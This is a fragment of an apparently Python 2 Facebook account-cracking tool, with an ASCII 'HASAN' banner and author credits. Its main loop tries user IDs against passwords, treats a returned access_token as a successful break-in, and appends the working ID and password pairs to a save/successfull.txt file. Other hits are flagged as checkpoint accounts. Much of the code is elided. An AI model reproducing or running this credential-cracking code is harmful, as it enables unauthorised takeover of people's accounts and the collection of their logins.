...
`7MMF'  `7MMF'      db       .M"""bgd      db      `7MN.   `7MF'
  MM      MM       ;MM:     ,MI    "Y     ;MM:       MMN.    M  
  MM      MM      ,V^MM.    `MMb.        ,V^MM.      M YMb   M  
  MMmmmmmmMM     ,M  `MM      `YMMNq.   ,M  `MM      M  `MN. M  
  MM      MM     AbmmmqMA   .     `MM   AbmmmqMA     M   `MM.M  
  MM      MM    A'     VML  Mb     dM  A'     VML    M     YMM  
.JMML.  .JMML..AMA.   .AMMA.P"Ybmmd" .AMA.   .AMMA..JML.    YM  
...
print("\033[0;91mThis Tool's By HASAN-VAU")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : HASAN-VAU'
    print '\033[0;94mFACEBOOK : HASA N'
    print '\033[0;96mITools  : 🤙🥱🤙-EEROR'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HASAN-OhsiT-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [HASAN-Yho-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
